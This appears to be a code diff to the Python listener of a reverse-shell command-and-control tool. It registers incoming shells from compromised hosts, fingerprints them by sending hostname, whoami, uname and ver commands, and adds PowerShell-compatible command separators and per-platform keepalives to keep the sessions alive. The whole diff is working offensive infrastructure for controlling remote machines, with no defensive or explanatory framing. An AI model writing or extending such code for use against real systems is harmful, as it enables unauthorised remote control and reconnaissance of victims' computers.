@@ -18,10 +18,11 @@ from app.utils import clean_shell_output
 class ShellConnection:
     """Represents an active reverse shell connection."""
     
-    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int):
+    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int, platform: str = "Unknown"):
         self.conn = conn
         self.addr = addr
         self.shell_id = shell_id
+        self.platform = platform
         self.lock = threading.Lock()
         self.is_active = True
         self.ws_attached = False  # True when a WebSocket terminal is actively reading
@@ -289,10 +290,12 @@ class ShellListener:
                             pass
                         return chunks.decode('utf-8', errors='replace')
 
-                    # Info gathering: use echo markers with && which works on
-                    # both Unix bash/sh and Windows cmd.exe.  The `hostname`
-                    # and `whoami` commands exist on all major platforms.
-                    hostname_cmd = f'echo {marker_start} && hostname && echo {marker_end}\n'
+                    # Info gathering: use echo markers with ; which works on
+                    # bash/sh, PowerShell, and cmd.exe (via &).  We use ;
+                    # because PowerShell doesn't support && in older versions.
+                    # The `hostname` and `whoami` commands exist on all major
+                    # platforms.
+                    hostname_cmd = f'echo {marker_start}; hostname; echo {marker_end}\n'
                     hostname_raw = _send_and_recv(hostname_cmd)
                     hostname = _extract_output(hostname_raw, marker_start, marker_end)
                     if not hostname or hostname == "unknown":
@@ -300,12 +303,12 @@ class ShellListener:
 
                     # whoami exists on both Unix and Windows.  Fall back to
                     # %USERNAME% on Windows if whoami is missing.
-                    user_cmd = f'echo {marker_start} && whoami && echo {marker_end}\n'
+                    user_cmd = f'echo {marker_start}; whoami; echo {marker_end}\n'
                     shell_user_raw = _send_and_recv(user_cmd)
                     shell_user = _extract_output(shell_user_raw, marker_start, marker_end)
                     if not shell_user or shell_user == "unknown":
                         # Fallback for Windows without whoami
-                        fallback_cmd = f'echo {marker_start} && echo %USERNAME% && echo {marker_end}\n'
+                        fallback_cmd = f'echo {marker_start}; echo %USERNAME%; echo {marker_end}\n'
                         fb_raw = _send_and_recv(fallback_cmd)
                         fb = _extract_output(fb_raw, marker_start, marker_end)
                         if fb and fb != '%USERNAME%':
@@ -313,26 +316,30 @@ class ShellListener:
                         else:
                             shell_user = "unknown"
 
-                    # OS detection: try uname first (Unix), then ver (Windows).
-                    # Run them as separate commands to avoid syntax issues.
-                    os_cmd = f'echo {marker_start} && uname -s && echo {marker_end}\n'
-                    os_info_raw = _send_and_recv(os_cmd)
-                    os_info = _extract_output(os_info_raw, marker_start, marker_end)
-                    os_info_full = os_info_raw
-                    if 'Linux' in os_info or 'Linux' in os_info_full:
-                        platform = 'Linux'
-                    elif 'Darwin' in os_info or 'Darwin' in os_info_full:
-                        platform = 'macOS'
-                    elif any(w in os_info_full for w in ['Windows', 'Microsoft', 'MINGW', 'MSYS', 'CYGWIN']):
+                    # OS detection: check the initial banner first, then probe.
+                    banner_text = initial_banner.decode('utf-8', errors='replace') if initial_banner else ''
+                    win_indicators = ['Windows', 'Microsoft', 'MINGW', 'MSYS', 'CYGWIN', 'PowerShell', 'PS C:\\', 'C:\\']
+                    if any(w in banner_text for w in win_indicators):
                         platform = 'Windows'
                     else:
-                        # uname failed — try Windows 'ver'
-                        ver_cmd = f'echo {marker_start} && ver && echo {marker_end}\n'
-                        ver_raw = _send_and_recv(ver_cmd)
-                        if any(w in ver_raw for w in ['Windows', 'Microsoft']):
+                        os_cmd = f'echo {marker_start}; uname -s; echo {marker_end}\n'
+                        os_info_raw = _send_and_recv(os_cmd)
+                        os_info = _extract_output(os_info_raw, marker_start, marker_end)
+                        os_info_full = os_info_raw
+                        if 'Linux' in os_info or 'Linux' in os_info_full:
+                            platform = 'Linux'
+                        elif 'Darwin' in os_info or 'Darwin' in os_info_full:
+                            platform = 'macOS'
+                        elif any(w in os_info_full for w in win_indicators):
                             platform = 'Windows'
                         else:
-                            platform = 'Unknown'
+                            # uname failed — try Windows 'ver'
+                            ver_cmd = f'echo {marker_start}; ver; echo {marker_end}\n'
+                            ver_raw = _send_and_recv(ver_cmd)
+                            if any(w in ver_raw for w in ['Windows', 'Microsoft']):
+                                platform = 'Windows'
+                            else:
+                                platform = 'Unknown'
 
                     # Attempt PTY upgrade on Unix-like systems for a proper
                     # interactive shell (colour, job control, etc.)
@@ -418,7 +425,7 @@ class ShellListener:
                 
                 # Store connection
                 with self.lock:
-                    self.connections[shell_id] = ShellConnection(conn, addr, shell_id)
+                    self.connections[shell_id] = ShellConnection(conn, addr, shell_id, platform=platform)
                 
                 print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")
                 
@@ -438,13 +445,18 @@ class ShellListener:
                                     db.session.commit()
                             continue
 
-                        # Keepalive: send a no-op that is silent on all platforms.
-                        # Unix: `true` produces no output.  Windows cmd: `rem`
-                        # is a comment.  We try both via `||`.
+                        # Keepalive: send a no-op appropriate for the detected
+                        # platform.  On PowerShell, neither `true` nor `rem`
+                        # are valid — use an empty string expression instead.
                         conn.settimeout(30)
                         try:
-                            conn.sendall(b'true 2>/dev/null || rem\n')
-                        except (BrokenPipeError, ConnectionResetError, OSError):
+                            if platform == 'Windows':
+                                # PowerShell: `$null` is a valid no-op expression
+                                conn.sendall(b'$null\n')
+                            else:
+                                # Unix: `true` is a builtin that always succeeds
+                                conn.sendall(b'true\n')
+                        except (BrokenPipeError, ConnectionResetError, OSError, ConnectionAbortedError):
                             print(f"[-] Keepalive failed for shell {shell_id} — connection broken")
                             break
                         # Drain the keepalive response so it doesn't
@@ -466,7 +478,7 @@ class ShellListener:
                             if shell_record:
                                 shell_record.last_seen = datetime.utcnow()
                                 db.session.commit()
-                    except (BrokenPipeError, ConnectionResetError):
+                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
                         print(f"[-] Shell {shell_id} connection reset")
                         break
                     except Exception:
